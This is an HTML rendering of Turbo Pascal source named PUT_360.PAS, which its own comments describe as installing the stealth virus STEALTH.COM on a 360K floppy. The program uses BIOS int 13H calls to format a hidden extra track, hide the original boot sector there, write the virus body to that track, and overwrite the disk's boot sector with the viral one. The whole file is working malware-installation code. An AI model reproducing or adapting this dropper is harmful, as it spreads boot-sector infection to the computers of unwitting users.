<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>PUT_360.PAS</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
	color: #808080;
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">program</span><span class="sc0"> </span><span class="sc11">put_360</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc1">{This program puts the stealth virus STEALTH.COM on a   }</span><span class="sc0">
                     </span><span class="sc1">{360K floppy diskette.                                  }</span><span class="sc0">
</span><span class="sc5">uses</span><span class="sc0"> </span><span class="sc11">dos</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">type</span><span class="sc0">
  </span><span class="sc11">rec_spec</span><span class="sc0">         </span><span class="sc10">=</span><span class="sc5">record</span><span class="sc0">       </span><span class="sc1">{Record for formatting sectors w/ int 13H}</span><span class="sc0">
    </span><span class="sc11">cyl</span><span class="sc0">            </span><span class="sc10">:</span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">{Cylinder (Track) number}</span><span class="sc0">
    </span><span class="sc11">head</span><span class="sc0">           </span><span class="sc10">:</span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">{Head number}</span><span class="sc0">
    </span><span class="sc11">rec</span><span class="sc0">            </span><span class="sc10">:</span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">{Record (sector) number}</span><span class="sc0">
    </span><span class="sc11">number</span><span class="sc0">         </span><span class="sc10">:</span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">{Size (2=512 bytes/sec)}</span><span class="sc0">
    </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">const</span><span class="sc0">                            </span><span class="sc1">{Data to format 6 secs @ Trk 40, Hd 1, Sec 1-6}</span><span class="sc0">
  </span><span class="sc11">rec_defs</span><span class="sc0">         </span><span class="sc10">:</span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">6</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">rec_spec</span><span class="sc10">=((</span><span class="sc11">cyl</span><span class="sc10">:</span><span class="sc4">40</span><span class="sc10">;</span><span class="sc11">head</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">rec</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">number</span><span class="sc10">:</span><span class="sc4">2</span><span class="sc10">),</span><span class="sc0">
                                             </span><span class="sc10">(</span><span class="sc11">cyl</span><span class="sc10">:</span><span class="sc4">40</span><span class="sc10">;</span><span class="sc11">head</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">rec</span><span class="sc10">:</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc11">number</span><span class="sc10">:</span><span class="sc4">2</span><span class="sc10">),</span><span class="sc0">
                                             </span><span class="sc10">(</span><span class="sc11">cyl</span><span class="sc10">:</span><span class="sc4">40</span><span class="sc10">;</span><span class="sc11">head</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">rec</span><span class="sc10">:</span><span class="sc4">3</span><span class="sc10">;</span><span class="sc11">number</span><span class="sc10">:</span><span class="sc4">2</span><span class="sc10">),</span><span class="sc0">
                                             </span><span class="sc10">(</span><span class="sc11">cyl</span><span class="sc10">:</span><span class="sc4">40</span><span class="sc10">;</span><span class="sc11">head</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">rec</span><span class="sc10">:</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc11">number</span><span class="sc10">:</span><span class="sc4">2</span><span class="sc10">),</span><span class="sc0">
                                             </span><span class="sc10">(</span><span class="sc11">cyl</span><span class="sc10">:</span><span class="sc4">40</span><span class="sc10">;</span><span class="sc11">head</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">rec</span><span class="sc10">:</span><span class="sc4">5</span><span class="sc10">;</span><span class="sc11">number</span><span class="sc10">:</span><span class="sc4">2</span><span class="sc10">),</span><span class="sc0">
                                             </span><span class="sc10">(</span><span class="sc11">cyl</span><span class="sc10">:</span><span class="sc4">40</span><span class="sc10">;</span><span class="sc11">head</span><span class="sc10">:</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">rec</span><span class="sc10">:</span><span class="sc4">6</span><span class="sc10">;</span><span class="sc11">number</span><span class="sc10">:</span><span class="sc4">2</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc5">var</span><span class="sc0">
  </span><span class="sc11">disk_buffer</span><span class="sc0">      </span><span class="sc10">:</span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">5119</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc1">{Data area to read virus into}</span><span class="sc0">
  </span><span class="sc11">boot</span><span class="sc0">             </span><span class="sc10">:</span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">511</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc1">{Data area to read boot sec into}</span><span class="sc0">
  </span><span class="sc11">virus</span><span class="sc0">            </span><span class="sc10">:</span><span class="sc5">file</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">{Virus code file variable}</span><span class="sc0">


</span><span class="sc1">{This function executes a BIOS Disk Access (int 13H) call.}</span><span class="sc0">
</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">biosdisk</span><span class="sc10">(</span><span class="sc11">cmd</span><span class="sc10">,</span><span class="sc11">drive</span><span class="sc10">,</span><span class="sc11">head</span><span class="sc10">,</span><span class="sc11">track</span><span class="sc10">,</span><span class="sc11">sector</span><span class="sc10">,</span><span class="sc11">nsects</span><span class="sc10">:</span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
                  </span><span class="sc11">buffer</span><span class="sc10">:</span><span class="sc11">pointer</span><span class="sc10">):</span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
  </span><span class="sc11">regs</span><span class="sc0">             </span><span class="sc10">:</span><span class="sc11">registers</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc11">regs.AH</span><span class="sc10">:=</span><span class="sc11">cmd</span><span class="sc10">;</span><span class="sc0">                              </span><span class="sc1">{ah = function number}</span><span class="sc0">
  </span><span class="sc11">regs.DL</span><span class="sc10">:=</span><span class="sc11">drive</span><span class="sc10">;</span><span class="sc0">                            </span><span class="sc1">{dl = drive number}</span><span class="sc0">
  </span><span class="sc11">regs.DH</span><span class="sc10">:=</span><span class="sc11">head</span><span class="sc10">;</span><span class="sc0">                             </span><span class="sc1">{dh = head number}</span><span class="sc0">
  </span><span class="sc11">regs.CH</span><span class="sc10">:=</span><span class="sc11">track</span><span class="sc10">;</span><span class="sc0">                            </span><span class="sc1">{ch = track number}</span><span class="sc0">
  </span><span class="sc11">regs.CL</span><span class="sc10">:=</span><span class="sc11">sector</span><span class="sc10">;</span><span class="sc0">                           </span><span class="sc1">{cl = sector number}</span><span class="sc0">
  </span><span class="sc11">regs.AL</span><span class="sc10">:=</span><span class="sc11">nsects</span><span class="sc10">;</span><span class="sc0">                           </span><span class="sc1">{al = # of sectors to operate on}</span><span class="sc0">
  </span><span class="sc11">regs.ES</span><span class="sc10">:=</span><span class="sc11">seg</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">^);</span><span class="sc0">                     </span><span class="sc1">{es:bx = data buffer}</span><span class="sc0">
  </span><span class="sc11">regs.BX</span><span class="sc10">:=</span><span class="sc11">ofs</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">^);</span><span class="sc0">
  </span><span class="sc11">intr</span><span class="sc10">(</span><span class="sc4">$13</span><span class="sc10">,</span><span class="sc11">regs</span><span class="sc10">);</span><span class="sc0">                            </span><span class="sc1">{Execute the interrupt}</span><span class="sc0">
  </span><span class="sc11">biosdisk</span><span class="sc10">:=</span><span class="sc11">regs.AH</span><span class="sc10">;</span><span class="sc0">                         </span><span class="sc1">{Return code in ah}</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">biosdisk</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">40</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">6</span><span class="sc10">,</span><span class="sc0">@</span><span class="sc11">rec_defs</span><span class="sc10">)&lt;&gt;</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">    </span><span class="sc1">{Format 6 recs @ Trk 40, Hd 1}</span><span class="sc0">
    </span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Couldn''t format extra track on disk!'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">biosdisk</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0">@</span><span class="sc11">boot</span><span class="sc10">)&lt;&gt;</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">        </span><span class="sc1">{Read original boot sector}</span><span class="sc0">
    </span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Couldn''t read original boot sector!'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">biosdisk</span><span class="sc10">(</span><span class="sc4">3</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">40</span><span class="sc10">,</span><span class="sc4">6</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0">@</span><span class="sc11">boot</span><span class="sc10">)&lt;&gt;</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">        </span><span class="sc1">{Put it @ Trk 40, Hd 1, Sec 6}</span><span class="sc0">
    </span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Couldn''t write original boot sector!'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">assign</span><span class="sc10">(</span><span class="sc11">virus</span><span class="sc10">,</span><span class="sc7">'STEALTH.COM'</span><span class="sc10">);</span><span class="sc0">                   </span><span class="sc1">{Open the virus code file}</span><span class="sc0">
  </span><span class="sc11">reset</span><span class="sc10">(</span><span class="sc11">virus</span><span class="sc10">,</span><span class="sc4">256</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">seek</span><span class="sc10">(</span><span class="sc11">virus</span><span class="sc10">,</span><span class="sc4">$6F</span><span class="sc10">);</span><span class="sc0">                               </span><span class="sc1">{Position fp to start of code}</span><span class="sc0">
  </span><span class="sc11">BlockRead</span><span class="sc10">(</span><span class="sc11">virus</span><span class="sc10">,</span><span class="sc11">disk_buffer</span><span class="sc10">,</span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">               </span><span class="sc1">{Read 5 sectors to ram}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">biosdisk</span><span class="sc10">(</span><span class="sc4">3</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">40</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0">@</span><span class="sc11">disk_buffer</span><span class="sc10">)&lt;&gt;</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc1">{Write @ Trk 40, Hd 1, Sec 1}</span><span class="sc0">
    </span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Couldn''t write stealth routines to disk!'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">seek</span><span class="sc10">(</span><span class="sc11">virus</span><span class="sc10">,</span><span class="sc4">$7B</span><span class="sc10">);</span><span class="sc0">                               </span><span class="sc1">{Position fp to viral boot sec}</span><span class="sc0">
  </span><span class="sc11">BlockRead</span><span class="sc10">(</span><span class="sc11">virus</span><span class="sc10">,</span><span class="sc11">disk_buffer</span><span class="sc10">,</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">                </span><span class="sc1">{Read it}</span><span class="sc0">
  </span><span class="sc11">move</span><span class="sc10">(</span><span class="sc11">boot</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">],</span><span class="sc11">disk_buffer</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">],</span><span class="sc4">$32</span><span class="sc10">);</span><span class="sc0">              </span><span class="sc1">{Move orig boot data into it}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">biosdisk</span><span class="sc10">(</span><span class="sc4">3</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0">@</span><span class="sc11">disk_buffer</span><span class="sc10">)&lt;&gt;</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">  </span><span class="sc1">{And make it the new boot sec}</span><span class="sc0">
    </span><span class="sc11">writeln</span><span class="sc10">(</span><span class="sc7">'Couldn''t write viral boot sector to disk!'</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">virus</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">end.</span></div></body>
</html>
